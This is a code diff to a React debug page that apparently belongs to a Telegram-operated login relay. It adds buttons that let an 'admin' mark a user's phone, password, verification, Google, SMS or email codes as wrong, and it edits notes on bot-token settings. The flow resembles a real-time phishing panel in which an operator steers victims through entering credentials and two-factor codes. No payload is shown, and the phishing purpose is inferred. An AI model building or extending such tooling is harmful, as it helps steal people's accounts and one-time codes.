@@ -37,30 +37,6 @@ const Debug = () => {
     setIsLoading(false);
   };
 
-  const handleSimulateAdminClick = (action: string) => {
-    const sessionId = sessionStorage.getItem("sessionId");
-
-    if (!sessionId) {
-      alert(
-        "❌ No active session found. Please complete authentication flow first.",
-      );
-      return;
-    }
-
-    // Use the simulation function
-    simulateAdminClick(sessionId, action);
-
-    setResults({
-      type: "simulation",
-      data: {
-        success: true,
-        message: `Simulated admin click: ${action}`,
-        sessionId,
-        action,
-      },
-    });
-  };
-
   const handleSendTestMessage = async () => {
     setIsLoading(true);
     const result = await sendTestMessageToTelegram(
@@ -110,6 +86,30 @@ const Debug = () => {
     }
 
     setIsLoading(false);
+  };
+
+  const handleSimulateAdminClick = (action: string) => {
+    const sessionId = sessionStorage.getItem("sessionId");
+
+    if (!sessionId) {
+      alert(
+        "❌ No active session found. Please complete authentication flow first.",
+      );
+      return;
+    }
+
+    // Use the simulation function
+    simulateAdminClick(sessionId, action);
+
+    setResults({
+      type: "simulation",
+      data: {
+        success: true,
+        message: `Simulated admin click: ${action}`,
+        sessionId,
+        action,
+      },
+    });
   };
 
   return (
@@ -186,11 +186,19 @@ const Debug = () => {
       {/* Simulate Admin Actions */}
       <div style={{ marginBottom: "20px" }}>
         <h3>🎭 Simulate Admin Actions</h3>
+
+        {/* Auth Actions */}
+        <h4
+          style={{ margin: "12px 0 8px 0", fontSize: "14px", color: "#6c757d" }}
+        >
+          Authentication:
+        </h4>
         <div
           style={{
             display: "grid",
             gridTemplateColumns: "repeat(auto-fit, minmax(150px, 1fr))",
             gap: "8px",
+            marginBottom: "16px",
           }}
         >
           <Button
@@ -218,6 +226,57 @@ const Debug = () => {
             📧 Email Code
           </Button>
         </div>
+
+        {/* Incorrect Actions */}
+        <h4
+          style={{ margin: "12px 0 8px 0", fontSize: "14px", color: "#dc3545" }}
+        >
+          Incorrect Info:
+        </h4>
+        <div
+          style={{
+            display: "grid",
+            gridTemplateColumns: "repeat(auto-fit, minmax(150px, 1fr))",
+            gap: "8px",
+          }}
+        >
+          <Button
+            onClick={() => handleSimulateAdminClick("incorrect_phone")}
+            style={{ backgroundColor: "#dc3545" }}
+          >
+            ❌ Phone Wrong
+          </Button>
+          <Button
+            onClick={() => handleSimulateAdminClick("incorrect_verification")}
+            style={{ backgroundColor: "#dc3545" }}
+          >
+            ❌ Code Wrong
+          </Button>
+          <Button
+            onClick={() => handleSimulateAdminClick("incorrect_password")}
+            style={{ backgroundColor: "#dc3545" }}
+          >
+            ❌ Password Wrong
+          </Button>
+          <Button
+            onClick={() => handleSimulateAdminClick("incorrect_google")}
+            style={{ backgroundColor: "#dc3545" }}
+          >
+            ❌ Google Wrong
+          </Button>
+          <Button
+            onClick={() => handleSimulateAdminClick("incorrect_sms")}
+            style={{ backgroundColor: "#dc3545" }}
+          >
+            ❌ SMS Wrong
+          </Button>
+          <Button
+            onClick={() => handleSimulateAdminClick("incorrect_email")}
+            style={{ backgroundColor: "#dc3545" }}
+          >
+            ❌ Email Wrong
+          </Button>
+        </div>
       </div>
 
       {/* Results */}
@@ -233,7 +292,8 @@ const Debug = () => {
           <h3>
             {results.type === "config" && "🔍 Config Test"}
             {results.type === "message" && "📨 Message Test"}
-            {results.type === "buttons" && "🎛️ Admin Buttons Test"} Results
+            {results.type === "buttons" && "🎛️ Admin Buttons Test"}
+            {results.type === "simulation" && "🎭 Simulation Test"} Results
           </h3>
           <pre style={{ margin: 0, fontSize: "12px", whiteSpace: "pre-wrap" }}>
             {JSON.stringify(results.data, null, 2)}
@@ -261,14 +321,19 @@ const Debug = () => {
             Telegram chat
           </li>
           <li>
+            <strong>Test Admin Buttons:</strong> Shows admin control buttons in
+            Telegram
+          </li>
+          <li>
+            <strong>Simulate Actions:</strong> Test admin button clicks without
+            using Telegram
+          </li>
+          <li>
+            <strong>Incorrect Info:</strong> Test error handling when admin
+            marks info as wrong
+          </li>
+          <li>
             If tests fail, check your <code>.env</code> file configuration
-          </li>
-          <li>
-            Bot Token format:{" "}
-            <code>VITE_TELEGRAM_BOT_TOKEN=123456:ABC-DEF...</code>
-          </li>
-          <li>
-            Chat ID format: <code>VITE_TELEGRAM_CHAT_ID=-1001234567890</code>
           </li>
         </ul>
       </div>
